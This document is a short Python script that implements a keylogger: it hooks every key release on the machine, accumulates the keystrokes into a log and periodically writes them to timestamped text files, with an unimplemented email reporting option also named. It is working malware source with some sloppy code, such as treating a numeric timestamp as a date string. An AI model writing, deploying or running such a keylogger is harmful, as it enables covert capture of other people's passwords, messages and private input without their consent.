import keyboard
from threading import Timer
from time import time

send_report_every = 60

class Keylogger():
    def __init__(self, interval, report_method='email'):
        self.interval = interval
        self.report_method = report_method

        self.log = ''

        self.start_dt = time()
        self.end_dt = time()

        self.last_activity_time = time()
        self.last_keypress = time()
        self.idle_time = 10


    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            
            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."
            
            else:
                name = name.replace(" ", "_")
                name = f'[{name.upper()}]'

        self.log += name
        self.idle_time = 0

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
        self.filename = f'kelog-{start_dt_str}_{end_dt_str}'

    def report_to_file(self):
        with open(f'{self.filename}.txt', "w") as f:
            print(self.log, file=f)
            print(f'[+] Saved {self.filename}.text')

    def report(self):
        if self.log:
            if time() - self.last_keypress > self.idle_time:
                self.log += '\n'
        
        # Guardar el registro en un archivo o enviar por correo electrónico
        self.update_filename()
        if self.report_method == 'file':
            self.report_to_file()
            print(f'[+] Saved {self.filename}.txt')
        
        self.log = ''
        self.last_activity_time = time()
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    
    def start(self):
        self.start_dt = time()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f'{time()} - Started keylogger')
        keyboard.wait()

keylogger = Keylogger(interval=send_report_every, report_method="file")
keylogger.start()
